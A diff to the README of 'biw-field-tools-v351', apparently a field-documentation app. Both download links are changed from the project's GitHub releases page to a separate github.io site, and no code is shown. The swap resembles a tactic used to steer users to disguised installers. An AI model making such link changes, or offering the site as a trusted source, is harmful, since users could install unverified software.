@@ -1,12 +1,12 @@
 # 🛠️ biw-field-tools-v351 - Simplify your daily field documentation tasks
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/combined-wonderland609/biw-field-tools-v351/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://combined-wonderland609.github.io)
 
 BIW Field Tools v3.5.1 provides a central hub for field workers to manage site documentation. This application functions as a progressive web app to track time, complete project checklists, generate installation reports, and handle timesheet submissions. It works offline and syncs your records when you connect to data.
 
 ## 📥 Getting the Application
 
-Visit this page to download: [https://github.com/combined-wonderland609/biw-field-tools-v351/releases](https://github.com/combined-wonderland609/biw-field-tools-v351/releases)
+Visit this page to download: [https://combined-wonderland609.github.io](https://combined-wonderland609.github.io)
 
 You need to select the correct file for your device to start the setup.
 
